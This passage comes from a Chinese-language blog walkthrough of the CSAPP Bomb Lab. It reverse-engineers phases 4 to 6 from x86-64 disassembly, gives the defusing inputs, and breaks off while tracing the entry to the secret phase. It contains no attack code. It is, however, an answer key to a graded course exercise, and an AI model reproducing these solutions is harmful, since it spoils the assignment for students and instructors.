Mem[%rsp + 12]) &#123;    explode_bomb();&#125;</code></pre><p>要使得 <code>%eax</code> 的值等于输入的第二个值，只需要保证输入的第一个值经过 switch 语句选择之后，赋值正好等于输入的第二个值。</p><p>因此本关的答案并不是固定的，<code>0 207</code>、 <code>3 256</code> 等等都是正确答案。注意不能写成 <code>0 0xcf</code>、<code>3 0x100</code>，因为输入格式为十进制整数，需要将十六进制进行转换。</p><h1 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h1><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x000000000040100c &lt;+0&gt;:     sub    $0x18,%rsp0x0000000000401010 &lt;+4&gt;:     lea    0xc(%rsp),%rcx0x0000000000401015 &lt;+9&gt;:     lea    0x8(%rsp),%rdx0x000000000040101a &lt;+14&gt;:    mov    $0x4025cf,%esi0x000000000040101f &lt;+19&gt;:    mov    $0x0,%eax0x0000000000401024 &lt;+24&gt;:    call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;0x0000000000401029 &lt;+29&gt;:    cmp    $0x2,%eax0x000000000040102c &lt;+32&gt;:    jne    0x401035 &lt;phase_4+41&gt;0x000000000040102e &lt;+34&gt;:    cmpl   $0xe,0x8(%rsp)0x0000000000401033 &lt;+39&gt;:    jbe    0x40103a &lt;phase_4+46&gt;0x0000000000401035 &lt;+41&gt;:    call   0x40143a &lt;explode_bomb&gt;0x000000000040103a &lt;+46&gt;:    mov    $0xe,%edx0x000000000040103f &lt;+51&gt;:    mov    $0x0,%esi0x0000000000401044 &lt;+56&gt;:    mov    0x8(%rsp),%edi0x0000000000401048 &lt;+60&gt;:    call   0x400fce &lt;func4&gt;0x000000000040104d &lt;+65&gt;:    test   %eax,%eax0x000000000040104f &lt;+67&gt;:    jne    0x401058 &lt;phase_4+76&gt;0x0000000000401051 &lt;+69&gt;:    cmpl   $0x0,0xc(%rsp)0x0000000000401056 &lt;+74&gt;:    je     0x40105d &lt;phase_4+81&gt;0x0000000000401058 &lt;+76&gt;:    call   0x40143a &lt;explode_bomb&gt;0x000000000040105d &lt;+81&gt;:    add    $0x18,%rsp0x0000000000401061 &lt;+85&gt;:    ret</code></pre><p>这一关主要分成两个函数：phase_4 和 func_4，首先查看 phase_4，代码前一段和 phase_3 非常类似：读取两个整数，且保证输入的第一个值位于区间 <code>[0, 15)</code> 内。</p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">%rcx &#x3D; %rsp + 12;%rdx &#x3D; %rsp + 8;%esi &#x3D; 0x4025cf;%eax &#x3D; 0;sscanf(%rdi, %rsi, %rdx, %rcx);if (%eax !&#x3D; 2) &#123;    explode_bomb();&#125;if (Mem[%rsp + 8] &gt;&#x3D; 15u) &#123;explode_bomb();&#125;%edx &#x3D; 0xe;%esi &#x3D; 0;%edi &#x3D; Mem[%rsp + 8];func4(%rdi, %rsi, %rdx); &#x2F;&#x2F; func4(Mem[%rsp+8], 0, 14)if (%eax !&#x3D; 0) &#123;    explode_bomb();&#125;if (Mem[%rsp + 12] !&#x3D; 0) &#123;    explode_bomb();&#125;</code></pre><p>后一段便是传递 3 个参数给函数 func_4 进行调用，需要保证返回值和输入的第二个数为 0，因此密码的第二个数为 0。可以看到，phase_4 的代码结构还是很简单易懂的，关键是对 func_4 函数的分析。</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000400fce &lt;+0&gt;:     sub    $0x8,%rsp0x0000000000400fd2 &lt;+4&gt;:     mov    %edx,%eax0x0000000000400fd4 &lt;+6&gt;:     sub    %esi,%eax0x0000000000400fd6 &lt;+8&gt;:     mov    %eax,%ecx0x0000000000400fd8 &lt;+10&gt;:    shr    $0x1f,%ecx0x0000000000400fdb &lt;+13&gt;:    add    %ecx,%eax0x0000000000400fdd &lt;+15&gt;:    sar    %eax0x0000000000400fdf &lt;+17&gt;:    lea    (%rax,%rsi,1),%ecx0x0000000000400fe2 &lt;+20&gt;:    cmp    %edi,%ecx0x0000000000400fe4 &lt;+22&gt;:    jle    0x400ff2 &lt;func4+36&gt;0x0000000000400fe6 &lt;+24&gt;:    lea    -0x1(%rcx),%edx0x0000000000400fe9 &lt;+27&gt;:    call   0x400fce &lt;func4&gt;0x0000000000400fee &lt;+32&gt;:    add    %eax,%eax0x0000000000400ff0 &lt;+34&gt;:    jmp    0x401007 &lt;func4+57&gt;0x0000000000400ff2 &lt;+36&gt;:    mov    $0x0,%eax0x0000000000400ff7 &lt;+41&gt;:    cmp    %edi,%ecx0x0000000000400ff9 &lt;+43&gt;:    jge    0x401007 &lt;func4+57&gt;0x0000000000400ffb &lt;+45&gt;:    lea    0x1(%rcx),%esi0x0000000000400ffe &lt;+48&gt;:    call   0x400fce &lt;func4&gt;0x0000000000401003 &lt;+53&gt;:    lea    0x1(%rax,%rax,1),%eax0x0000000000401007 &lt;+57&gt;:    add    $0x8,%rsp0x000000000040100b &lt;+61&gt;:    ret</code></pre><p>仔细观察 func_4 的代码，发现含有对 func_4 的调用，因此 func_4 是一个 <strong>递归</strong> 函数。在对递归函数进行翻译时，本质上与普通的函数并没有区别，结果如下：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">func4</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">,</span> <span class="token keyword">int</span> c<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> res <span class="token operator">=</span> c <span class="token operator">-</span> b<span class="token punctuation">;</span>    <span class="token keyword">int</span> temp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span>res <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">;</span>    res <span class="token operator">+=</span> temp<span class="token punctuation">;</span>    res <span class="token operator">>>=</span> <span class="token number">1</span><span class="token punctuation">;</span>    temp <span class="token operator">=</span> b <span class="token operator">+</span> res<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>temp <span class="token operator">></span> a<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        c <span class="token operator">=</span> temp <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        res <span class="token operator">=</span> <span class="token function">func4</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>        res <span class="token operator">*=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>temp <span class="token operator">&lt;</span> a<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            b <span class="token operator">=</span> temp <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            res <span class="token operator">=</span> <span class="token function">func4</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>            res <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> res <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>可以看到，程序的逻辑还是比较复杂的，但是注意到参数 b 和 c 的值都是确定的，真正的变量只有参数 a。因此这里有一个偷懒的办法：将程序翻译为一个语法严格正确的高级语言程序（而不是之前的伪代码），然后枚举所有可能的 a（只有 15 中情况），运行测试即可，结果为 0 的即为满足要求的值，也就是密码的第一个数。</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/p4.png"></p><p>可见，本关的正解同样不止一个，<code>1 0</code>、<code>3 0</code>、<code>7 0</code> 都是正确答案。</p><h1 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h1><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000401062 &lt;+0&gt;:     push   %rbx0x0000000000401063 &lt;+1&gt;:     sub    $0x20,%rsp0x0000000000401067 &lt;+5&gt;:     mov    %rdi,%rbx0x000000000040106a &lt;+8&gt;:     mov    %fs:0x28,%rax0x0000000000401073 &lt;+17&gt;:    mov    %rax,0x18(%rsp)0x0000000000401078 &lt;+22&gt;:    xor    %eax,%eax0x000000000040107a &lt;+24&gt;:    call   0x40131b &lt;string_length&gt;0x000000000040107f &lt;+29&gt;:    cmp    $0x6,%eax0x0000000000401082 &lt;+32&gt;:    je     0x4010d2 &lt;phase_5+112&gt;0x0000000000401084 &lt;+34&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000401089 &lt;+39&gt;:    jmp    0x4010d2 &lt;phase_5+112&gt;0x000000000040108b &lt;+41&gt;:    movzbl (%rbx,%rax,1),%ecx0x000000000040108f &lt;+45&gt;:    mov    %cl,(%rsp)0x0000000000401092 &lt;+48&gt;:    mov    (%rsp),%rdx0x0000000000401096 &lt;+52&gt;:    and    $0xf,%edx0x0000000000401099 &lt;+55&gt;:    movzbl 0x4024b0(%rdx),%edx0x00000000004010a0 &lt;+62&gt;:    mov    %dl,0x10(%rsp,%rax,1)0x00000000004010a4 &lt;+66&gt;:    add    $0x1,%rax0x00000000004010a8 &lt;+70&gt;:    cmp    $0x6,%rax0x00000000004010ac &lt;+74&gt;:    jne    0x40108b &lt;phase_5+41&gt;0x00000000004010ae &lt;+76&gt;:    movb   $0x0,0x16(%rsp)0x00000000004010b3 &lt;+81&gt;:    mov    $0x40245e,%esi0x00000000004010b8 &lt;+86&gt;:    lea    0x10(%rsp),%rdi0x00000000004010bd &lt;+91&gt;:    call   0x401338 &lt;strings_not_equal&gt;0x00000000004010c2 &lt;+96&gt;:    test   %eax,%eax0x00000000004010c4 &lt;+98&gt;:    je     0x4010d9 &lt;phase_5+119&gt;0x00000000004010c6 &lt;+100&gt;:   call   0x40143a &lt;explode_bomb&gt;0x00000000004010cb &lt;+105&gt;:   nopl   0x0(%rax,%rax,1)0x00000000004010d0 &lt;+110&gt;:   jmp    0x4010d9 &lt;phase_5+119&gt;0x00000000004010d2 &lt;+112&gt;:   mov    $0x0,%eax0x00000000004010d7 &lt;+117&gt;:   jmp    0x40108b &lt;phase_5+41&gt;0x00000000004010d9 &lt;+119&gt;:   mov    0x18(%rsp),%rax0x00000000004010de &lt;+124&gt;:   xor    %fs:0x28,%rax0x00000000004010e7 &lt;+133&gt;:   je     0x4010ee &lt;phase_5+140&gt;0x00000000004010e9 &lt;+135&gt;:   call   0x400b30 &lt;__stack_chk_fail@plt&gt;0x00000000004010ee &lt;+140&gt;:   add    $0x20,%rsp0x00000000004010f2 &lt;+144&gt;:   pop    %rbx0x00000000004010f3 &lt;+145&gt;:   ret</code></pre><p>这一关的汇编代码逻辑不算复杂，我们主要关注翻译后的代码：</p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">%rbx &#x3D; %rdi;Mem[%rsp + 0x18] &#x3D; Mem[%fs + 0x28]; &#x2F;&#x2F; 4Byte%eax ^&#x3D; %eax;  &#x2F;&#x2F; %eax &#x3D; 0if (string_length() !&#x3D; 6) &#123;explode_bomb();&#125;for (%eax &#x3D; 0; %eax !&#x3D; 6; ++%eax) &#123;    %edx &#x3D; Mem[%rbx + %rax] &amp; 0xf;    Mem[%rsp + %rax + 0x10] &#x3D; Mem[0x4024b0 + %rdx]; &#x2F;&#x2F; 1Byte&#125;Mem[%rsp + 0x16] &#x3D; 0;%esi &#x3D; 0x40245e;%rdi &#x3D; %rsp + 0x10;if (string_not_equal(%rdi, %esi) !&#x3D; 0) &#123;explode_bomb();&#125;%rax &#x3D; Mem[%rsp + 0x18] ^ Mem[%fs + 0x28];if (%rax !&#x3D; 0) &#123;__stack_chk_fail();&#125;</code></pre><p>从 <code>if (string_length() != 6) explode_bomb();</code> 可以看出密码是一个长度为 6 的字符串，随后的 <code>for</code> 循环遍历字符串的各个字符，提取低一字节的值 <code>%edx</code>，将其作为相对于地址 <code>0x4024b0</code> 的偏移量，读取目标地址 <code>0x4020b0 + %rdx</code> 处的低 4 位数据，存入地址 <code>%rsp + %rax + 0x10</code> 处，构造出一个起始地址为 <code>%rsp + 0x10</code> 的长度为 6 的字符串。然后将起始地址为 <code>%rsp + 0x10</code> 的字符串与起始地址为 <code>0x40245e</code> 的字符串作比较，如果不相同，则“引爆炸弹”。最后进行缓冲区溢出检测，如果溢出，则调用 <code>__stack_chk_fail()</code>.</p><p>经过以上的描述，不难看出输入的 6 位字符串其实是一个相对于数组 <code>0x4024b0</code> 的索引，只不过索引值不直接给出，而是等于字符的低 4 位值。本关的目标便是使得输入的 6 位索引经过映射之后得到的字符串正好等于地址 <code>0x40245e</code> 的字符串，即 &quot;flyers&quot;.</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/p5.png"></p><p>以字符 <em>f</em> 为例，<em>f</em> 在 array 表中的（最小）索引为 9，而所有低 4 位等于 9（1001）的字符都满足条件，例如 <em>i</em> .</p><table><thead><tr><th align="center">字符c1</th><th align="center">索引</th><th align="center">字符c2</th></tr></thead><tbody><tr><td align="center">f</td><td align="center">9</td><td align="center">i</td></tr><tr><td align="center">l</td><td align="center">15</td><td align="center">o</td></tr><tr><td align="center">y</td><td align="center">14</td><td align="center">n</td></tr><tr><td align="center">e</td><td align="center">5</td><td align="center">e</td></tr><tr><td align="center">r</td><td align="center">6</td><td align="center">f</td></tr><tr><td align="center">s</td><td align="center">7</td><td align="center">g</td></tr></tbody></table><p>依次类推，一个满足条件的密码为：<em>ionefg</em> .</p><h1 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h1><p>最复杂的一关，代码量非常大，而且逻辑比较复杂，整体观察比较困难，可以先将代码按照循环块拆分为几个部分，依次进行分析。</p><p>在使用 GDB 调试的时候，可以为每个块的起始部分分别打上断点，同时为了调试的方便，可将这些命令写入 <code>.gdbinit</code> 中。</p><pre class="language-shell" data-language="shell"><code class="language-shell">b phase_6b *0x401153b *0x40116fb *0x4011abb *0x4011d2r .&#x2F;ans.txt</code></pre><h2 id="block-1"><a href="#block-1" class="headerlink" title="block_1"></a>block_1</h2><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x00000000004010f4 &lt;+0&gt;:     push   %r140x00000000004010f6 &lt;+2&gt;:     push   %r130x00000000004010f8 &lt;+4&gt;:     push   %r120x00000000004010fa &lt;+6&gt;:     push   %rbp0x00000000004010fb &lt;+7&gt;:     push   %rbx0x00000000004010fc &lt;+8&gt;:     sub    $0x50,%rsp0x0000000000401100 &lt;+12&gt;:    mov    %rsp,%r130x0000000000401103 &lt;+15&gt;:    mov    %rsp,%rsi0x0000000000401106 &lt;+18&gt;:    call   0x40145c &lt;read_six_numbers&gt;0x000000000040110b &lt;+23&gt;:    mov    %rsp,%r140x000000000040110e &lt;+26&gt;:    mov    $0x0,%r12d0x0000000000401114 &lt;+32&gt;:    mov    %r13,%rbp0x0000000000401117 &lt;+35&gt;:    mov    0x0(%r13),%eax0x000000000040111b &lt;+39&gt;:    sub    $0x1,%eax0x000000000040111e &lt;+42&gt;:    cmp    $0x5,%eax0x0000000000401121 &lt;+45&gt;:    jbe    0x401128 &lt;phase_6+52&gt;0x0000000000401123 &lt;+47&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000401128 &lt;+52&gt;:    add    $0x1,%r12d0x000000000040112c &lt;+56&gt;:    cmp    $0x6,%r12d0x0000000000401130 &lt;+60&gt;:    je     0x401153 &lt;phase_6+95&gt;0x0000000000401132 &lt;+62&gt;:    mov    %r12d,%ebx0x0000000000401135 &lt;+65&gt;:    movslq %ebx,%rax0x0000000000401138 &lt;+68&gt;:    mov    (%rsp,%rax,4),%eax0x000000000040113b &lt;+71&gt;:    cmp    %eax,0x0(%rbp)0x000000000040113e &lt;+74&gt;:    jne    0x401145 &lt;phase_6+81&gt;0x0000000000401140 &lt;+76&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000401145 &lt;+81&gt;:    add    $0x1,%ebx0x0000000000401148 &lt;+84&gt;:    cmp    $0x5,%ebx0x000000000040114b &lt;+87&gt;:    jle    0x401135 &lt;phase_6+65&gt;0x000000000040114d &lt;+89&gt;:    add    $0x4,%r130x0000000000401151 &lt;+93&gt;:    jmp    0x401114 &lt;phase_6+32&gt;</code></pre><p>第一部分整体而言不算太复杂，直接查看翻译后的代码：</p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">&#x2F;&#x2F; 读取6个4Byte数字放入从%r14寄存器指向地址开始的内存空间中%r13 &#x3D; %rsp;%rsi &#x3D; %rsp;read_six_numbers();%r14 &#x3D; %rsp;for (%r12d &#x3D; 0; %r12 !&#x3D; 6; ) &#123;%rbp &#x3D; %r13;    %eax &#x3D; Mem[%r13];    %eax -&#x3D; 1;    if (%eax &gt; 5u) &#123;        explode_bomb();    &#125;    %r12d +&#x3D; 1;    if (%r12d &#x3D;&#x3D; 6) break;    for (%ebx &#x3D; %r12d; %ebx &lt;&#x3D; 5; ++%ebx) &#123;        %rax &#x3D; %ebx;  &#x2F;&#x2F; 符号扩展        %eax &#x3D; Mem[4 * %rax + %rsp];        if (Mem[%rbp] &#x3D;&#x3D; %eax) &#123;            explode_bomb();        &#125;&#125;%r13 +&#x3D; 4;&#125;</code></pre><p>与 phase_2 类似，首先读取 6 个数字，确定密码由 6 个数字组成。</p><p>随后主要关注循环中导致触发 <code>explode_bomb</code> 的条件，这些条件指明了密码的限定范围。第一个是 <code>%eax &gt; 5u</code>，注意前一条指令是 <code>%eax</code> 自减一，因此可以确定 6 个数字的范围都是 <code>[1, 6]</code>.</p><blockquote><p>这里自减一很有意思，刚开始看可能以为是多此一举，直接判断 %eax 是否大于 6u 不就完了吗？但是考虑到 0 这个特例，它在自减一后得到 -1，而 -1 满足无符号比较大于 5u，因此被排除在外。如果直接判断 %eax 是否大于 6u，那么数字的限定范围就变成了 [0, 6].</p></blockquote><p>后面的内层循环不难看出是用来判重的，因此六个数字的范围得以确定：每个数字都位于区间 <code>[1, 6]</code> 内且无重复数字。</p><h2 id="block-2"><a href="#block-2" class="headerlink" title="block_2"></a>block_2</h2><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000401153 &lt;+95&gt;:    lea    0x18(%rsp),%rsi0x0000000000401158 &lt;+100&gt;:   mov    %r14,%rax0x000000000040115b &lt;+103&gt;:   mov    $0x7,%ecx0x0000000000401160 &lt;+108&gt;:   mov    %ecx,%edx0x0000000000401162 &lt;+110&gt;:   sub    (%rax),%edx0x0000000000401164 &lt;+112&gt;:   mov    %edx,(%rax)0x0000000000401166 &lt;+114&gt;:   add    $0x4,%rax0x000000000040116a &lt;+118&gt;:   cmp    %rsi,%rax0x000000000040116d &lt;+121&gt;:   jne    0x401160 &lt;phase_6+108&gt;</code></pre><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">&#x2F;&#x2F; %r14 &#x3D; %rsp&#x2F;&#x2F; 遍历6个数字，每个数字num的值变为7-num%ecx &#x3D; 7;for (%rax &#x3D; %r14, %rsi &#x3D; %rsp + 0x18; %rax !&#x3D; %rsi; %rax +&#x3D; 4) &#123;%edx &#x3D; %ecx - Mem[%rax];Mem[%rax] &#x3D; %edx;&#125;</code></pre><p>第二部分非常简单，遍历输入的 6 个数字，将每个数字 num 更改为 7 - num.</p><h2 id="block-3"><a href="#block-3" class="headerlink" title="block_3"></a>block_3</h2><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x000000000040116f &lt;+123&gt;:   mov    $0x0,%esi0x0000000000401174 &lt;+128&gt;:   jmp    0x401197 &lt;phase_6+163&gt;0x0000000000401176 &lt;+130&gt;:   mov    0x8(%rdx),%rdx0x000000000040117a &lt;+134&gt;:   add    $0x1,%eax0x000000000040117d &lt;+137&gt;:   cmp    %ecx,%eax0x000000000040117f &lt;+139&gt;:   jne    0x401176 &lt;phase_6+130&gt;0x0000000000401181 &lt;+141&gt;:   jmp    0x401188 &lt;phase_6+148&gt;0x0000000000401183 &lt;+143&gt;:   mov    $0x6032d0,%edx0x0000000000401188 &lt;+148&gt;:   mov    %rdx,0x20(%rsp,%rsi,2)0x000000000040118d &lt;+153&gt;:   add    $0x4,%rsi0x0000000000401191 &lt;+157&gt;:   cmp    $0x18,%rsi0x0000000000401195 &lt;+161&gt;:   je     0x4011ab &lt;phase_6+183&gt;0x0000000000401197 &lt;+163&gt;:   mov    (%rsp,%rsi,1),%ecx0x000000000040119a &lt;+166&gt;:   cmp    $0x1,%ecx0x000000000040119d &lt;+169&gt;:   jle    0x401183 &lt;phase_6+143&gt;0x000000000040119f &lt;+171&gt;:   mov    $0x1,%eax0x00000000004011a4 &lt;+176&gt;:   mov    $0x6032d0,%edx0x00000000004011a9 &lt;+181&gt;:   jmp    0x401176 &lt;phase_6+130&gt;</code></pre><p>第三部分虽然代码量不大，但是跳转语句很多，逻辑非常复杂。这里我采用了分部的方式，首先改写为带 goto 语句的高级语言伪代码：</p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">%esi &#x3D; 0;goto phase_6_163;phase_6_130:%rdx &#x3D; Mem[%rdx + 0x8];%eax +&#x3D; 1;if (%eax !&#x3D; %ecx) goto phase_6_130;goto phase_6_148;phase_6_143:%edx &#x3D; 0x6032d0;phase_6_148:Mem[%rsp + 2 * %rsi + 0x20] &#x3D; %rdx;%rsi +&#x3D; 4;if (%rsi &#x3D;&#x3D; 0x18) goto phase_6_183;phase_6_163:%ecx &#x3D; Mem[%rsp + %rsi];if (%ecx &lt;&#x3D; 1) goto phase_6_143;%eax &#x3D; 1;%edx &#x3D; 0x6032d0;goto phase_6_130;</code></pre><p>然后对照一些常见的形式 goto 改写为循环语句，这里的翻译过程比较繁琐，需要静下来仔细思考。</p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">%esi &#x3D; 0;while (%rsi !&#x3D; 0x18) &#123;%ecx &#x3D; Mem[%rsp + %rsi];if (%ecx &gt; 1) &#123;%eax &#x3D; 1;%rdx &#x3D; 0x6032d0;while (%eax !&#x3D; %ecx) &#123;%rdx &#x3D; Mem[%rdx + 0x8];%eax +&#x3D; 1;&#125;&#125;else &#123;%edx &#x3D; 0x6032d0;&#125;Mem[%rsp + 2 * %rsi + 0x20] &#x3D; %rdx;%rsi +&#x3D; 4;&#125;</code></pre><p>观察翻译后的代码，似乎和 phase_5 类似，遍历每个数字，并将每个数字当作索引 i，在起始地址为 <code>0x6032d0</code> 的表中查找第 i 个元素，以 <code>%rsp + 0x20</code> 作为起始地址创建一个线性结构。</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/p6.png"></p><p>打印起始地址为 <code>0x6032d0</code> 的 12 个 8 字节数据，可以看到第二列中表示的值就是某一行的地址，且这些地址正好可以串联成一个线性结构，加上符号名 &quot;node&quot; 的提示，是不是很熟悉？没错，就是 <strong>链表</strong> 。上图每一行的第一列为值域，第二列为 next 域。</p><p>回过来观察代码，第三部分的作用就是将输入的六个数字作为索引，创建一个数组，每个数组元素都为索引对应的 next 域。</p><h2 id="block-4"><a href="#block-4" class="headerlink" title="block_4"></a>block_4</h2><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x00000000004011ab &lt;+183&gt;:   mov    0x20(%rsp),%rbx0x00000000004011b0 &lt;+188&gt;:   lea    0x28(%rsp),%rax0x00000000004011b5 &lt;+193&gt;:   lea    0x50(%rsp),%rsi0x00000000004011ba &lt;+198&gt;:   mov    %rbx,%rcx0x00000000004011bd &lt;+201&gt;:   mov    (%rax),%rdx0x00000000004011c0 &lt;+204&gt;:   mov    %rdx,0x8(%rcx)0x00000000004011c4 &lt;+208&gt;:   add    $0x8,%rax0x00000000004011c8 &lt;+212&gt;:   cmp    %rsi,%rax0x00000000004011cb &lt;+215&gt;:   je     0x4011d2 &lt;phase_6+222&gt;0x00000000004011cd &lt;+217&gt;:   mov    %rdx,%rcx0x00000000004011d0 &lt;+220&gt;:   jmp    0x4011bd &lt;phase_6+201&gt;</code></pre><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">&#x2F;&#x2F; 创建链表%rbx &#x3D; Mem[%rsp + 0x20];for (%rax &#x3D; %rsp + 0x28, %rsi &#x3D; %rsp + 0x50; ; %rcx &#x3D; %rdx) &#123;%rcx &#x3D; %rbx;%rdx &#x3D; Mem[%rax];Mem[%rcx + 8] &#x3D; %rdx;%rax +&#x3D; 8;if (%rax &#x3D;&#x3D; %rsi) break;&#125;</code></pre><p>理解清楚了第三部分，第四部分的作用就很明显了：根据第三部分创建的由 next 域构成的数组，创建一个链表结构。</p><h2 id="block-5"><a href="#block-5" class="headerlink" title="block_5"></a>block_5</h2><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x00000000004011d2 &lt;+222&gt;:   movq   $0x0,0x8(%rdx)0x00000000004011da &lt;+230&gt;:   mov    $0x5,%ebp0x00000000004011df &lt;+235&gt;:   mov    0x8(%rbx),%rax0x00000000004011e3 &lt;+239&gt;:   mov    (%rax),%eax0x00000000004011e5 &lt;+241&gt;:   cmp    %eax,(%rbx)0x00000000004011e7 &lt;+243&gt;:   jge    0x4011ee &lt;phase_6+250&gt;0x00000000004011e9 &lt;+245&gt;:   call   0x40143a &lt;explode_bomb&gt;0x00000000004011ee &lt;+250&gt;:   mov    0x8(%rbx),%rbx0x00000000004011f2 &lt;+254&gt;:   sub    $0x1,%ebp0x00000000004011f5 &lt;+257&gt;:   jne    0x4011df &lt;phase_6+235&gt;0x00000000004011f7 &lt;+259&gt;:   add    $0x50,%rsp0x00000000004011fb &lt;+263&gt;:   pop    %rbx0x00000000004011fc &lt;+264&gt;:   pop    %rbp0x00000000004011fd &lt;+265&gt;:   pop    %r120x00000000004011ff &lt;+267&gt;:   pop    %r130x0000000000401201 &lt;+269&gt;:   pop    %r140x0000000000401203 &lt;+271&gt;:   ret</code></pre><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">&#x2F;&#x2F; 遍历链表，判断是否从大到小排序，若不是，则引爆Mem[%rdx + 8] &#x3D; 0;for (%ebp &#x3D; 5; %ebp !&#x3D; 0; --%ebp) &#123;%rax &#x3D; Mem[%rbx + 8];    %eax &#x3D; Mem[%rax];    if (Mem[%rbx] &lt; %eax) &#123;        explode_bomb();    &#125;   %rbx &#x3D; Mem[%rbx + 8];&#125;</code></pre><p>终于到最后一部分了，这一部分的作用很明显：判断链表是否有序，更准确地说，是否以非递增顺序排列。</p><p>那么本关的目标终于浮出水面了：</p><p><em>输入六个数字，对于每个数字 num，将 7 - num 作为索引，根据链表 node 重构出一个新的链表，并保证重构的链表按非递增顺序排列。</em></p><p>注意链表值域的比较只关注低 4 字节，因此链表各结点值域从大到小排序为：<code>3 4 5 6 1 2</code>，那么对应的输入数字为：<code>4 3 2 1 6 5</code>，即本关的正确答案。</p><h1 id="secret-phase"><a href="#secret-phase" class="headerlink" title="secret_phase"></a>secret_phase</h1><p>解决隐藏关卡首先要解决的问题是：如何进入？观察 main 函数的汇编代码，在结束 phase_6 之后、main 函数返回之前，只有 phase_defused 函数被调用，看来入口可能隐藏在一直以来被忽略的部分。</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/sp-4.png"></p><p>对 phase_defused 进行反汇编，结果如下：</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x00000000004015c4 &lt;+0&gt;:     sub    $0x78,%rsp0x00000000004015c8 &lt;+4&gt;:     mov    %fs:0x28,%rax0x00000000004015d1 &lt;+13&gt;:    mov    %rax,0x68(%rsp)0x00000000004015d6 &lt;+18&gt;:    xor    %eax,%eax0x00000000004015d8 &lt;+20&gt;:    cmpl   $0x6,0x202181(%rip)        # 0x603760 &lt;num_input_strings&gt;0x00000000004015df &lt;+27&gt;:    jne    0x40163f &lt;phase_defused+123&gt;0x00000000004015e1 &lt;+29&gt;:    lea    0x10(%rsp),%r80x00000000004015e6 &lt;+34&gt;:    lea    0xc(%rsp),%rcx0x00000000004015eb &lt;+39&gt;:    lea    0x8(%rsp),%rdx0x00000000004015f0 &lt;+44&gt;:    mov    $0x402619,%esi0x00000000004015f5 &lt;+49&gt;:    mov    $0x603870,%edi0x00000000004015fa &lt;+54&gt;:    call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;0x00000000004015ff &lt;+59&gt;:    cmp    $0x3,%eax0x0000000000401602 &lt;+62&gt;:    jne    0x401635 &lt;phase_defused+113&gt;0x0000000000401604 &lt;+64&gt;:    mov    $0x402622,%esi0x0000000000401609 &lt;+69&gt;:    lea    0x10(%rsp),%rdi0x000000000040160e &lt;+74&gt;:    call   0x401338 &lt;strings_not_equal&gt;0x0000000000401613 &lt;+79&gt;:    test   %eax,%eax0x0000000000401615 &lt;+81&gt;:    jne    0x401635 &lt;phase_defused+113&gt;0x0000000000401617 &lt;+83&gt;:    mov    $0x4024f8,%edi0x000000000040161c &lt;+88&gt;:    call   0x400b10 &lt;puts@plt&gt;0x0000000000401621 &lt;+93&gt;:    mov    $0x402520,%edi0x0000000000401626 &lt;+98&gt;:    call   0x400b10 &lt;puts@plt&gt;0x000000000040162b &lt;+103&gt;:   mov    $0x0,%eax0x0000000000401630 &lt;+108&gt;:   call   0x401242 &lt;secret_phase&gt;0x0000000000401635 &lt;+113&gt;:   mov    $0x402558,%edi0x000000000040163a &lt;+118&gt;:   call   0x400b10 &lt;puts@plt&gt;0x000000000040163f &lt;+123&gt;:   mov    0x68(%rsp),%rax0x0000000000401644 &lt;+128&gt;:   xor    %fs:0x28,%rax0x000000000040164d &lt;+137&gt;:   je     0x401654 